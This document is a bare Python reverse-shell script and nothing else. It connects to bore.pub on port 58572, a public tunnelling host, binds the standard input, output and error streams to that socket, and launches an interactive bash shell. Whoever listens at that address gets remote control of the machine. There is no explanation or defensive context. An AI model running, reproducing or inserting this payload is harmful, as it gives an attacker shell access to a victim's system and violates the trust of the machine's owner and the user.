import socket,subprocess,os
s=socket.socket()
s.connect(("bore.pub",58572))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
